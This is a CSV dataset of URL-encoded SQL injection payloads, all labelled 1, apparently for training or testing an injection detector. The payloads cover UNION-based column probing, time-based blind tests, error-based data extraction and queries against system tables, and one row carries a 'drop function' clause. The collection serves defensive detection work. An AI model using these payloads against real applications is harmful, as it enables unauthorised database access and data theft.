Query,Label
%2d%34%33%32%35 or%64%65%72 %62%79 %31%2d-,1
%2d%32%33%32%31%25%22  %29   %6f%72 %32%32%37%31  %3d  %37%36%38%33%2d%2d,1
%31%22  %29   %61s %72anl %77here 5%35%35%33  %3d  5%35%35%33,1
%31%27  %29   %77%68%65%72%65 %38%36%32%38  %3d  %38%36%32%38 uni%6fn a%6cl %73%65%6c%65%63%74 n%75%6c%6c%2cnu%6c%6c%2c%6e%75%6c%6c%2d-,1
"%2d30%30%37  %29   %77h%65re %36%36%34%38  %3d  %36%36%34%38 %75%6e%69%6fn al%6c %73%65%6c%65%63%74 %36%36%34%38,%36%36%34%38,%36%36%34%38,%36%36%34%38,%36%36%34%38,%36%36%34%38,%36%36%34%38,%36%36%34%38#",1
%31'||  %28  sele%63t '%61w%62%61%27 fro%6d du%61l %77%68%65%72%65 %337%34%39  %3d  %337%34%39 %61%6ed %31%3445  %3d  %33%33%33%34%2d%2d,1
-6186%27 %69%6e bo%6f%6c%65an %6d%6f%64%65  %29   u%6e%69o%6e al%6c %73elect 2%399%30%2c%32%39%39%30%2c%32%399%30%23,1
"%31'   %28  selec%74   %28  %63%61%73%65 w%68en   %28  %3545%31  %3d  %3545%31  %29   t%68%65%6e %72%65%67%65%78%70%5f%73%75%62%73%74ring  %28  %72%65p%65%61%74  %28  %72%69%67h%74  %28  %63%68%61%72  %28  %3545%31  %29  %2c0  %29  ,5000%30%30000  %29  %2c%6eull  %29   e%6cs%65 %63%68%61%72  %28  %310%38  %29  ||%63%68%61%72  %28  7%36  %29  ||%63%68%61%72  %28  11%32  %29  ||%63%68%61%72  %28  %31%316  %29   %65%6ed  %29   %66%72%6f%6d %69n%66or%6da%74%69%6fn%5f%73%63h%65m%61%2e%73%79st%65%6d_%75%73%65%72%73  %29  ",1
%31%22 %6fr   %28  %73%65%6c%65%63%74 %32%2a  %28  %69%66   %28    %28   %73%65%6c%65%63%74 %2a %66%72%6f%6d   %28  %73%65%6c%65%63%74 %63oncat  %28  %30%78%371%371%37%30%36%617%31%2c  %28  %73%65%6c%65%63%74   %28  e%6ct  %28  %38%31%31%33  %3d  %38%31%31%33%2c1   %29    %29     %29  %2c%30%787%31%37%61%37%367%61%37%31%2c0%78%378   %29    %29   %73  %29  %2c %38%34%34%36%374%340%37%33%370%39%35%35%316%31%30%2c %38%34%34%36%374%340%37%33%370%39%35%35%316%31%30   %29    %29     %29  ,1
%31%27  %29   %6f%72 %3838%34  %3d  l%69ke  %28  %27%61b%63%64%65fg%27%2cu%70p%65r  %28  %68%65x  %28  %72%61%6ed%6f%6d%62%6c%6f%62  %28  %350%30%30%30%30%30%30%30%2f%32   %29    %29      %29    %29    %61n%64   %28  '%78%64%63e'  %3d  %27x%64%63%65,1
"%31 %6f%72 74%317  %3d    %28  %73%65l%65%63%74 %63%6f%75%6e%74  %28  %2a  %29   %66%72om s%79%73%69%62m%2e%73%79%73%74a%62%6c%65%73 %61%73 t%31,s%79%73%69%62m%2e%73%79%73%74a%62%6c%65%73 %61%73 t2,s%79%73%69%62m%2e%73%79%73%74a%62%6c%65%73 %61%73 %74%33  %29  %2d%2d",1
%3%31%22 %77he%72e 4%30%37%33  %3d  4%30%37%33 rl%69ke   %28  %73%65%6c%65%63%74   %28  %63%6%31%73%65 %77%68%65%6e   %28  %38%37%3%316  %3d  %342%38%3%31  %29   %74%68e%6e %31 %65%6cs%65 %30%78%32%38 %65%6e%64   %29    %29   -%2d,1
"1%22   %29    %29     %29   un%69%6fn %61%6c%6c s%65%6c%65ct %6e%75%6c%6c%2cn%75%6c%6c%2c%6eul%6c%2c%6e%75%6c%6c,%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2d%2d",1
%77%61i%74%66o%72 d%65%6c%61%79 %270:0:5%27 %61nd    %28    %28   %22%25%22  %3d  %22,1
"%31""  %29   %77here 2%33%312  %3d  2%33%312 %61%6e%64   %28  s%65%6c%65%63%74 %39%30%36%37 %66%72o%6d  %28  s%65%6c%65%63%74 co%75%6et  %28  %2%61  %29  ,%63o%6ec%61%74  %28  %3%30%78%37%31%37%31%37%3%30%36%61%37%31%2c  %28  s%65%6c%65%63%74   %28  e%6ct  %28  %39%30%36%37  %3d  %39%30%36%37,1   %29    %29     %29  ,%30%78%37%317%6176%37%61%37%31%2cfloo%72  %28  r%61%6e%64  %28  %30  %29  %2%612   %29    %29   %78 %66%72o%6d %69%6e%66%6f%72%6d%61%74%69o%6e_%73%63%68%65%6d%61%2e%63%68%61%72%61%63%74e%72%5f%73%65%74%73 grou%70 b%79 %78  %29  %61  %29  %2d%2d",1
-9434%22  %29   a%73 %63qlw %77he%72%65 16%300  %3d  16%300 %6f%72 %32%3733  %3d  %31%304%37%2d-,1
"%31   %29    %29     %29   %75%6ei%6f%6e %61ll %73e%6ce%63%74 n%75%6cl,nu%6cl,nu%6c%6c%2cn%75%6cl,n%75ll,n%75%6c%6c%2cnull,%6e%75ll%2c%6e%75ll%23",1
%31%22   %29    %29    %61%6e%64 s%6c%6%35e%70  %28  %35  %29  %23,1
"%2d%359%325  %29   w%68ere 5%3758  %3d  5%3758 %75%6e%69%6f%6e %61%6cl %73%65%6c%65%63%74 5%3758,5%3758,5%3758,5%3758,5%3758,5%3758,5%3758,5%3758,5%3758#",1
"%31""  %29   %77%68%65%72e 2%38%37%33  %3d  2%38%37%33 %6fr %37%34%31%37  %3d    %28  se%6c%65ct co%75n%74  %28  %2a  %29   %66%72%6fm %73%79s%69%62m%2e%73%79%73%74%61%62l%65%73 %61%73 t1,%73%79s%69%62m%2e%73%79%73%74%61%62l%65%73 %61%73 t2,%73%79s%69%62m%2e%73%79%73%74%61%62l%65%73 %61%73 t%33  %29  %2d-",1
"%31 pro%63ed%75%72e %61nalys%65  %28  %65%78%74%72a%63%74%76%61%6c%75%65  %28  9%3255%2c%63onc%61t  %28  %30%78%35%63%2c  %28  ben%63hmark  %28  %35%30%3000%300,%6d%64%35  %28  0x525%315a50   %29    %29      %29    %29     %29  ,%31  %29  %23 %75%73us",1
%31%22 w%68er%65 6%30%30%34  %3d  6%30%30%34,1
1%22   %29    %29    %61%73 %73%76%69%6d wh%65%72e %34%39%32%34  %3d  %34%39%32%34 an%64 %37%3932  %3d  58%370,1
%31%22   %29    %29     %29   %61%6e%64 %38%359%34  %3d    %28  %73%6%35le%63%74 %38%359%34 %66%72%6f%6d p%67_s%6c%6%35e%70  %28  %35   %29    %29   %2d-,1
"%31  %29   un%69%6f%6e %61%6c%6c selec%74 %6eu%6cl%2c%6eul%6c%2cnul%6c,nu%6c%6c,%6eu%6c%6c%2d-",1
%2d29%35%3%31%22 %6f%72 %34%349%33  %3d  %75t%6c_%69na%64dr.%67et%5fh%6fs%74%5faddr%65ss  %28  %63%68%72  %28  %31%3%31%33  %29  %7c%7c%63%68%72  %28  %31%3%31%33  %29  %7c%7c%63%68%72  %28  %3%31%3%31%32  %29  %7c%7c%63%68%72  %28  %3%31%3%30%36  %29  %7c%7c%63%68%72  %28  %31%3%31%33  %29  %7c%7c  %28  sel%65ct   %28  %63%6%31%73%65 %77h%65%6e   %28  %34%349%33  %3d  %34%349%33  %29   %74%68%65n %31 els%65 %30 %65%6ed  %29   %66ro%6d %64%75%61%6c  %29  %7c%7c%63%68%72  %28  %31%3%31%33  %29  %7c%7c%63%68%72  %28  %31%32%32  %29  %7c%7c%63%68%72  %28  %31%318  %29  %7c%7c%63%68%72  %28  %31%32%32  %29  %7c%7c%63%68%72  %28  %31%3%31%33   %29    %29   ,1
"%31%%27   %29    %29    %75ni%6fn %61%6c%6c %73ele%63%74 null,n%75%6c%6c%2c%6eu%6c%6c%2c%6e%75l%6c%2c%6e%75ll%2c%6eull,null%2cn%75l%6c,%6e%75%6c%6c%23",1
%2d4644 %6fr %35%39%3%30%33  %3d    %28  %27%7%31q%7%30%6a%7%31%27%7c%7c  %28  %73%65%6c%65%63%74 %63%6%31%73e %35%39%3%30%33 %77%68%65%6e %35%39%3%30%33 %74he%6e %31 %65%6cs%65 %30 %65%6e%64 fro%6d %72%64%62%24%64a%74%61%62%61%73%65  %29  |%7c%27%71%7a%76z%71%27  %29  %23 %75pw%64,1
1%27   %29    %29     %29   %6f%72 %32%36%33%33  %3d  db%6ds_pi%70%%36%35.%72%%36%35c%%36%35i%76%%36%35_me%73s%61%67e  %28  %63%68%72  %28  %31%31%32  %29  ||%63%68%72  %28  %36%35  %29  ||%63%68%72  %28  %36%35  %29  ||%63%68%72  %28  %310%33  %29  %2c%35  %29   %61n%64    %28    %28     %28  'o%63%68%72' li%6be 'o%63%68%72,1
"%31%22 a%6e%64 %34%3386  %3d  utl%5f%69%6e%6%31d%64%72.%67%65t_ho%73%74%5f%6%31d%64%72%65%73%73  %28  ch%72  %28  %3%31%3%31%33  %29  %7c|ch%72  %28  %3%31%3%31%33  %29  %7c|ch%72  %28  %31%3%31%32  %29  %7c|ch%72  %28  %3%31%30%36  %29  %7c|ch%72  %28  %3%31%3%31%33  %29  %7c|  %28  %73%65%6c%65c%74   %28  %63%6%31%73%65 %77%68%65n   %28  %34%3386  %3d  %34%3386  %29   t%68en %31 %65%6cs%65 %30 %65%6ed  %29   f%72%6fm %64%75%61%6c  %29  %7c|ch%72  %28  %3%31%3%31%33  %29  %7c|ch%72  %28  %3%312%32  %29  %7c|ch%72  %28  %31%318  %29  %7c|ch%72  %28  %3%312%32  %29  %7c|ch%72  %28  %3%31%3%31%33   %29    %29    a%6e%64 ""ar%71b"" %6c%69%6b%65 %22%61%72q%62",1
%31  %29   %77h%65%72%65 %37%397%38  %3d  %37%397%38 o%72 742%37  %3d  %64%62%6d%73%5f%70%69%70e%2er%65%63e%69%76%65%5f%6de%73%73%61%67%65  %28  %63%68%72  %28  %31%316  %29  ||%63%68%72  %28  %387  %29  ||%63%68%72  %28  %39%30  %29  ||%63%68%72  %28  %3%310%39  %29  %2c%35  %29  -%2d,1
-%39%39%37%37%22 %77%68%65%72%65 %35%31%332  %3d  %35%31%332 %75%6e%69o%6e al%6c %73%65lect %35%31%332--,1
%2d8047%27 %6f%72 %33%30%33%38  %3d  %33%30%33%38,1
"%31%27  %29   %6fr %34%3411  %3d    %28  %73%65%6c%65%63%74 %63%6f%75%6e%74  %28  %2a  %29   %66rom %73%79%73u%73%65r%73 %61s sys1,%73%79%73u%73%65r%73 %61s sys2,%73%79%73u%73%65r%73 %61s sys3,%73%79%73u%73%65r%73 %61s sys4,%73%79%73u%73%65r%73 %61s sys5,%73%79%73u%73%65r%73 %61s sys6,%73%79%73u%73%65r%73 %61s sy%73%37  %29   %61%6e%64   %28  %27%75%77%62%68%27  %3d  %27%75w%62%68",1
"%31 %75%6e%69%6f%6e %61l%6c s%65%6c%65c%74 null%2cn%75l%6c,null,n%75ll,n%75ll,null,n%75%6cl-%2d",1
1%27   %29    %29     %29   %61%6ed %375%333  %3d  %375%333 %61%6ed    %28    %28     %28  'tx%65x'  %3d  %27tx%65x,1
%31  %29   %61%73 %64u%71b %77here %36%34%39%35  %3d  %36%34%39%35,1
"1%27   %29    %29    %61s gq%7ay %77%68%65%72%65 2%33%31%32  %3d  2%33%31%32 %6fr 52%386  %3d    %28  %73%65le%63t cou%6et  %28  %2a  %29   %66r%6fm %61%6c%6c%5f%75s%65%72%73 t1,%61%6c%6c%5f%75s%65%72%73 t2,%61%6c%6c%5f%75s%65%72%73 t3,%61%6c%6c%5f%75s%65%72%73 t4,%61%6c%6c%5f%75s%65%72%73 t%35  %29  -%2d",1
"%31%25%27   %29    %29     %29   %70%72%6f%63%65%64%75%72%65 %61nal%79s%65  %28  %65%78tra%63%74v%61%6c%75%65  %28  9255,%63%6f%6ec%61t  %28  %30%785c,  %28  b%65nc%68%6dar%6b  %28  500%30000,md%35  %28  %30%785%32%35%31%35a%35%30   %29    %29      %29    %29     %29  %2c1  %29   %61%6e%64    %28    %28     %28  %27%25%27  %3d  %27",1
%31%27  %29   w%68%65%72%65 %393%30%34  %3d  %393%30%34 o%72 %36%39%37%39  %3d  lik%65  %28  'abc%64efg'%2cu%70%70er  %28  h%65x  %28  r%61nd%6f%6dbl%6fb  %28  %35%30%30%30%30%30%30%300%2f2   %29    %29      %29    %29   %2d%2d,1
"%31%27|%7c  %28  %73e%6c%%3%36%35ct 'dj%6fe' f%7%32o%6d %64%75al %77%68e%7%32%%3%36%35 %3%38%3%30%36%33  %3d  %3%38%3%30%36%33   %28  %73e%6c%%3%36%35ct   %28  cas%%3%36%35 %77%68%%3%36%35n   %28  45%387  %3d  45%387  %29   %74h%%3%36%35n %7%32eg%%3%36%35xp_%73ubstri%6eg  %28  %7%32%%3%36%35%7%30%%3%36%35%61%74  %28  %6ce%66%74  %28  %63r%79%7%30%74%5f%6b%%3%36%35%79  %28  c%68%61r  %28  %3%36%35  %29  ||c%68%61r  %28  %369  %29  ||c%68%61r  %28  %383  %29  %2c%6e%75ll  %29  %2c%3%30  %29  ,5%30%30%30%3%30%3%30%30%30%30  %29  %2c%6e%75ll  %29   el%73e c%68%61r  %28  7%36  %29  ||c%68%61r  %28  %3%36%35  %29  ||c%68%61r  %28  %31%30%32  %29  ||c%68%61r  %28  7%32  %29   %65n%64  %29   f%7%32o%6d   %28  valu%65s  %28  %30   %29    %29      %29    %29   ||%27",1
-%38%35%35%33%27%2b  %28  %73%65l%65%63%74 ad%6b%6f %77%68%65%72e %31%3750  %3d  %31%3750 %75%6e%69%6fn %61%6c%6c %73%65l%65%63%74 %31%3750#,1
"%31"" %77%68%6%35%72%6%35 %397%392  %3d  %397%392 %72%6c%69%6b%6%35   %28  %73%6%35le%63%74 %2a f%72om   %28  %73%6%35le%63%74  %28  %73%6c%6%35%6%35%70  %28  %35   %29    %29     %29  %76%77%79%71  %29  %23",1
"sel%65%63%74 %2a fro%6d %67%65%6e%65%72a%74%65%5f%73%65%72%69%65s  %28  %38%3%31%347%2c%38%314%37,%63a%73e w%68%65%6e   %28  8%3%31%347  %3d  %363%336  %29   t%68en %31 %65l%73%65 %30 e%6ed  %29   l%69%6d%69%74 %31%2d-",1
%2d%37%38%38%39%22   %29    %29    %61s %6f%61%79f w%68ere %317%36%35  %3d  %317%36%35 %6fr %385%371  %3d  %385%371--,1
"%31%27|%7c  %28  sele%63t %27%6dzh%6a%27 w%68e%72e %3967%37  %3d  %3967%37 %75ni%6f%6e %61%6cl sele%63t nu%6c%6c,%6e%75%6c%6c%2c%6eul%6c%2d%2d",1
%31%27 w%68%65%72e %37%391%30  %3d  %37%391%30,1
%65%6ed a%6e%64    %28    %28     %28  %34%36%37%35  %3d  %34%36%37%35,1
%73elect   %28  %63a%73e %77%68%65%6e   %28  9%36%396  %3d  %328%37%34  %29   %74%68%65%6e %31 e%6c%73%65 9%36%396*  %28  %73elect 9%36%396 fr%6f%6d %6d%61%73%74%65%72%2e.%73%79%73da%74%61b%61s%65%73  %29   en%64  %29  %2d%2d,1
%31'   %29    %29     %29   %61%6e%64 320%32  %3d  %6ci%6be  %28  %27a%62%63%64%65%66%67'%2cu%70%70%65r  %28  h%65%78  %28  r%61%6e%64omblob  %28  5%300%300%300%30%30/%32   %29    %29      %29    %29    %61%6e%64    %28    %28     %28  '%74%7a%72%64'  %3d  '%74%7a%72%64,1
%31%22  %29   %61%73 ym%73c %77h%65%72%65 %33%36%39%34  %3d  %33%36%39%34 w%61%69t%66o%72 %64%65%6c%61%79 %27%30:0%3a5'%2d-,1
%31%27%7c%7c  %28  %73%65l%65ct %27np%65l' %66%72%6f%6d %64%75%61%6c w%68%65r%65 %3%352%358  %3d  %3%352%358,1
"%3%31'%2b  %28  %73%65%6c%65%63t voh%67 wh%65%72e 638%33  %3d  638%33 %6%31nd 6%3%30%355  %3d  %63%74%78%73%79s%2e%64%72%69th%73%78%2es%6e  %28  6%3%30%355,  %28  ch%72  %28  %3%3%31%3%313  %29  %7c|ch%72  %28  %3%3%31%3%313  %29  %7c|ch%72  %28  %31%31%32  %29  %7c|ch%72  %28  %31%3%306  %29  %7c|ch%72  %28  %3%3%31%3%313  %29  %7c|  %28  %73%65%6c%65%63t   %28  %63ase %77%68%65%6e   %28  6%3%30%355  %3d  6%3%30%355  %29   th%65%6e %31 %65ls%65 %30 %65%6e%64  %29   %66%72%6f%6d %64ual  %29  %7c|ch%72  %28  %3%3%31%3%313  %29  %7c|ch%72  %28  %3%31%32%32  %29  %7c|ch%72  %28  %31%318  %29  %7c|ch%72  %28  %3%31%32%32  %29  %7c|ch%72  %28  %3%3%31%3%313   %29    %29      %29    %29   +%27",1
"%31%27   %29    %29    %6f%72 %34%34%31%31  %3d    %28  s%65l%65%63%74 %63%6f%75n%74  %28  %2a  %29   fr%6f%6d %73y%73us%65r%73 %61%73 sys1,%73y%73us%65r%73 %61%73 sys2,%73y%73us%65r%73 %61%73 sys3,%73y%73us%65r%73 %61%73 sys4,%73y%73us%65r%73 %61%73 sys5,%73y%73us%65r%73 %61%73 sys6,%73y%73us%65r%73 %61%73 %73%79%737  %29   %61nd    %28    %28   %27%6e%69%72%6f%27  %3d  'nir%6f",1
%3%31%25%27   %29    %29    r%6c%69ke   %28  %73%65l%65%63%74   %28  ca%73e wh%65n   %28  %36094  %3d  %37%3893  %29   th%65n %31 %65%6cse %30%78%32%38 %65%6e%64   %29    %29    %61nd    %28    %28   %27%25%27  %3d  %27,1
"%31  %29   %61%6e%64 8%3148  %3d  %6ci%6b%65  %28  %27ab%63d%65fg',upper  %28  h%65%78  %28  r%61%6e%64omblob  %28  %35%30%300%30000%30/%32   %29    %29      %29    %29   %2d%2d",1
%31%27  %29   %77here 5%35%34%30  %3d  5%35%34%30 w%61i%74%66%6f%72 del%61y '0:0:%35'-%2d,1
%3%31'  %29   %72%6c%69%6b%65   %28  %73%65%6c%65%63t   %28  c%6%31%73e %77%68%65%6e   %28  %3744%37  %3d  39%38%31  %29   t%68en %31 %65%6c%73%65 %30%78%32%38 en%64   %29    %29 ,1
1'%2b  %28  %73e%6ce%63t %6c%70%74%62 w%68er%6%35 %3%338%361  %3d  %3%338%361 %6fr sl%6%35e%70  %28  %35   %29    %29   +%27,1
%69%66  %28  %3%36%37%36%37  %3d  %350%32%32  %29   se%6c%65%63t %3%36%37%36%37 %65%6c%73e %64%72o%70 %66%75%6ect%69%6f%6e %62u%69%69--,1
"  %28  %73e%6cect %2a %66r%6f%6d   %28  %73e%6cect  %28  %73%6c%6%35%6%35%70  %28  %35   %29    %29     %29  %73%72%6d%71  %29   a%6e%64    %28    %28     %28  ""eak%74%22 li%6b%65 ""eak%74",1
"%31""   %29    %29     %29   %61%6e%64 200%36  %3d  200%36",1
"-9%3370'  %29   %77%68%65%72%65 %370%37%30  %3d  %370%37%30 %6fr ma%6be_%73et  %28  93%354  %3d  93%354,7185  %29  %2d%2d",1
"%31 %77%68%65%72%65 6%3169  %3d  6%3169   %28  %73e%6c%65ct   %28  c%61%73%65 wh%65%6e   %28  545%31  %3d  545%31  %29   %74%68e%6e %72%65g%65%78%70%5f%73%75%62s%74rin%67  %28  %72ep%65%61%74  %28  %72%69%67%68%74  %28  c%68ar  %28  545%31  %29  %2c0  %29  %2c%35%30%30%30%30%30%300%30  %29  ,%6eu%6cl  %29   %65ls%65 c%68ar  %28  %3%310%38  %29  ||c%68ar  %28  %37%36  %29  ||c%68ar  %28  %31%312  %29  ||c%68ar  %28  %31%316  %29   e%6e%64  %29   fr%6fm i%6efor%6dat%69on%5fsche%6d%61%2esy%73tem%5f%75ser%73  %29  %2d%2d",1
%2d4%39%306'   %29    %29     %29   %6f%72 %34%34%39%33  %3d  utl%5fina%64dr.%67et_host_addres%73  %28  ch%72  %28  %3%31%3%31%33  %29  |%7cch%72  %28  %3%31%3%31%33  %29  |%7cch%72  %28  %3%31%3%31%32  %29  |%7cch%72  %28  %3%31%3%30%36  %29  |%7cch%72  %28  %3%31%3%31%33  %29  |%7c  %28  %73e%6ce%63%74   %28  %63%6%31s%65 %77%68%65%6e   %28  %34%34%39%33  %3d  %34%34%39%33  %29   %74%68%65%6e %31 %65%6c%73%65 %30 %65nd  %29   f%72om %64%75%61l  %29  |%7cch%72  %28  %3%31%3%31%33  %29  |%7cch%72  %28  %3%31%322  %29  |%7cch%72  %28  %31%318  %29  |%7cch%72  %28  %3%31%322  %29  |%7cch%72  %28  %3%31%3%31%33   %29    %29    %61%6e%64    %28    %28     %28  %27%70%6b%72%71%27  %3d  'p%6brq,1
"%31%27%2b  %28  sel%6%35ct %76%78%61%78 wher%6%35 %39%30%336  %3d  %39%30%336 %61nd %6%35l%74  %28  1%32%310  %3d  1%32%310,sleep  %28  %35   %29    %29     %29  +%27",1
%31  %29   %61s b%70%61%70 wh%6%35re %377%3%35%38  %3d  %377%3%35%38 %6f%72 %34%32%34%30  %3d    %28  %73%6%35%6c%6%35%63%74 %34%32%34%30 %66rom %70%67%%35f%73%6ce%6%35p  %28  %35   %29    %29   %2d%2d,1
%2d%31%31%388   %29    %29    %75%6e%69%6f%6e %61%6c%6c se%6c%65c%74 %34%37%31%31%2d%2d,1
"%2d%32%36%30%31%27  %29   u%6ei%6fn al%6c s%65%6c%65%63%74 %32%38%36%36,%32%38%366%2c%32%38%36%36%2c%32%386%36%2c%32%386%36%2c%32%38%36%36%2d%2d",1
%31   %29    %29     %29   %61%6ed   %28  %33%30%32%30  %3d  %33%30%32%30  %29  %2a%367%30%33 %61%6ed    %28    %28     %28  %3%31%32%33%33  %3d  %3%31%32%33%33,1
"%31 w%68%65r%65 69%365  %3d  69%365 %61%6ed %65%6c%74  %28  3%39%33%33  %3d  %31232,%31232  %29  %2d-",1
%3%31%25%22   %29    %29    %6%31%6ed %33%37%35%34  %3d    %28  %73%65%6c%65%63t %75%7%30p%65%72  %28  %78%6dlt%79%7%30%65  %28  %63%68%72  %28  %36%3%30  %29  |%7c%63%68%72  %28  %35%38  %29  |%7c%63%68%72  %28  %3%31%3%31%33  %29  |%7c%63%68%72  %28  %3%31%3%31%33  %29  |%7c%63%68%72  %28  %31%31%32  %29  |%7c%63%68%72  %28  %3%31%3%306  %29  |%7c%63%68%72  %28  %3%31%3%31%33  %29  |%7c  %28  %73%65%6c%65%63t   %28  %63as%65 %77h%65%6e   %28  %33%37%35%34  %3d  %33%37%35%34  %29   t%68e%6e %31 %65%6c%73e %30 %65%6e%64  %29   %66rom %64%75%61%6c  %29  |%7c%63%68%72  %28  %3%31%3%31%33  %29  |%7c%63%68%72  %28  %312%32  %29  |%7c%63%68%72  %28  %31%318  %29  |%7c%63%68%72  %28  %312%32  %29  |%7c%63%68%72  %28  %3%31%3%31%33  %29  |%7c%63%68%72  %28  6%32   %29    %29     %29   %66rom %64%75%61%6c  %29   %6%31%6ed    %28    %28   %22%25%22  %3d  %22,1
%73e%6c%65%63%74 %64%62%6d%73%5f%70%69%70%65%2e%72%65ce%69%76e%5f%6d%65s%73%61%%36%37e  %28  ch%72  %28  %366  %29  ||ch%72  %28  %36%37  %29  ||ch%72  %28  %37%39  %29  ||ch%72  %28  1%30%31  %29  %2c%35  %29   fr%6f%6d %64%75%61%6c a%6e%64    %28    %28     %28  %27%78%6d%77j%27  %3d  %27%78%6d%77%6a,1
"1%27%7c%7c  %28  %73e%6c%65%63%74 %27nv%72%71%27 fr%6fm d%75%61l %77%68%65%72%65 %34%33%33%37  %3d  %34%33%33%37 %6f%72 %35%33%35%36  %3d    %28  %73e%6c%65%63%74 %63%6f%75%6e%74  %28  %2a  %29   fr%6fm %73%79%73%75%73%65%72%73 %61%73 sys1,%73%79%73%75%73%65%72%73 %61%73 sys2,%73%79%73%75%73%65%72%73 %61%73 sys3,%73%79%73%75%73%65%72%73 %61%73 sys4,%73%79%73%75%73%65%72%73 %61%73 sys5,%73%79%73%75%73%65%72%73 %61%73 sys6,%73%79%73%75%73%65%72%73 %61%73 %73%79s7  %29  -%2d",1
"%2d%31%36%30%36%27%7c%7c  %28  %73el%65%63%74 %27%71%62%61%61%27 %77h%65%72%65 3%396%37  %3d  3%396%37 u%6e%69%6fn %61ll %73el%65%63%74 3%396%37,3%396%37,3%396%37,3%396%37,3%396%37--",1
"%31%27  %29   %61s jr%77x %77%68e%72%65 %36%30%38%37  %3d  %36%30%38%37 %61%6e%64 %75p%64%61te%78ml  %28  33%393,%63on%63a%74  %28  %30%782%65%2c%30%787%31%37%31%370%36%61%37%31%2c  %28  %73e%6c%65c%74   %28  %65%6c%74  %28  %33393  %3d  %33%3393,1   %29    %29     %29  %2c%30%78%37%31%37%61%37%36%37%61%37%31  %29  ,%31161  %29  %2d-",1
"%31%27   %29    %29     %29   p%72oc%65du%72e %6%31nalys%65  %28  extra%63t%76alue  %28  5%38%34%3%30%2c%63%6f%6e%63a%74  %28  %30x%35%63,%3%30x%37%317%3%317%306%6%317%3%31%2c  %28  sel%65ct   %28  %63%6%31%73%65 %77%68en   %28  %35%384%30  %3d  %35%384%30  %29   %74h%65%6e %31 e%6cs%65 %30 e%6e%64   %29    %29   ,%30x7%317a767a7%31   %29    %29   ,%31  %29   %61nd    %28    %28     %28  %27%77n%7av%27  %3d  %27%77%6e%7a%76",1
"%31%27  %29   %6f%72 e%6c%74  %28  %36%32%37%32  %3d  %36%32%37%32,sleep  %28  %35   %29    %29   ",1
"1%27 %6f%72 %32%3633  %3d  %64b%6ds_p%69pe.%72e%63%%36%35ive_m%%36%35s%73a%67%%36%35  %28  %63hr  %28  11%32  %29  ||%63hr  %28  %36%35  %29  ||%63hr  %28  %36%35  %29  ||%63hr  %28  1%303  %29  ,%35  %29  ",1
-%396%329%27   %29    %29     %29   %75%6eio%6e %61%6c%6c %73e%6ce%63%74 30%377%2c%33%30%37%37%2c%33%30%37%37%2c%33%30%377%23,1
"-%31876'||  %28  sel%65ct '%69%74%66%63%27 %66%72%6f%6d d%75a%6c wh%65%72e %39%35%38%34  %3d  %39%35%38%34 u%6e%69%6f%6e %61%6cl sel%65ct %39%35%38%34,%39%35%38%34,%39%35%38%34,%39%35%38%34,%39%35%38%34,%39%35%38%34,%39%35%38%34,%39%35%38%34--",1
%2d%353%36%39%27  %29   %6f%72 %33%32%308  %3d  %36669#,1
%31   %29    %29    a%73 %70r%78q wh%65re 460%30  %3d  460%30,1
%31%'   %29    %29     %29   %72%6c%69%6b%6%35 sl%6%35ep  %28  %35  %29  %23,1
"%31%27 a%6ed %34%32%34%31  %3d  %63%6fn%76%65%72t  %28  in%74,  %28  %73%65%6c%65%63%74 c%68%61%72  %28  %31%31%33  %29  %2bc%68%61%72  %28  %31%31%33  %29  %2bc%68%61%72  %28  1%312  %29  %2bc%68%61%72  %28  %31%30%36  %29  %2bc%68%61%72  %28  %31%31%33  %29  %2b  %28  %73%65%6c%65%63%74   %28  cas%65 w%68en   %28  %34%32%34%31  %3d  %34%32%34%31  %29   t%68%65n c%68%61%72  %28  4%39  %29   el%73%65 c%68%61%72  %28  %34%38  %29   %65nd   %29    %29   %2bc%68%61%72  %28  %31%31%33  %29  %2bc%68%61%72  %28  1%322  %29  %2bc%68%61%72  %28  %31%31%38  %29  %2bc%68%61%72  %28  1%322  %29  %2bc%68%61%72  %28  %31%31%33   %29    %29     %29  ",1
%31  %29   an%64 84%307  %3d    %28  selec%74 %63%6fu%6et  %28  %2a  %29   %66r%6f%6d gen%65rat%65%5fseries  %28  %3%31%2c%35%30%30%30%30%30%30   %29    %29    an%64   %28  2%3160  %3d  2%3160,1
"%31""   %29    %29    %61%73 %6a%73%64%63 w%68%65%72%65 %32%37%34%38  %3d  %32%37%34%38",1
"%2d%3950%37%25%22 u%6eion a%6c%6c s%65%6c%65%63%74 %33%33%34%32%2c%33%33%34%32%2c%33%33%34%32%2c33%34%32,%33%33%34%32%23",1
%31  %29   %77h%65r%65 97%308  %3d  97%308,1
